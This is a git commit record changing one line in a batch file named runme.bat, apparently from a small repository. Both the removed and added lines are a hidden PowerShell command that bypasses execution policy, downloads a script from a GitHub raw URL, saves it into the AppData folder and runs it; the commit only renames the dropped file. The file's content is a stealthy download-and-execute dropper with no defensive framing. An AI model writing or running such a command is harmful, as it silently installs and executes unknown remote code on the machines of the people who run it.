d53793a9b37ad19d34c45df2127d270dbab43f68
AnonAm93 <am9.9@outlook.com>
2024-10-05 15:14:24 -0700

    Update runme.bat

--- runme.bat
+++ runme.bat
@@ -1,1 +1,1 @@
- powershell -w h -NoP -NonI -Ep Bypass "echo (iwr https://github.com/AnonAm93/1/raw/refs/heads/main/Am.ps1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATa\c.ps1""
+ powershell -w h -NoP -NonI -Ep Bypass "echo (iwr https://github.com/AnonAm93/1/raw/refs/heads/main/Am.ps1).content > "$env:APPDATA\Am.ps1";powershell "$env:APPDATa\Am.ps1""
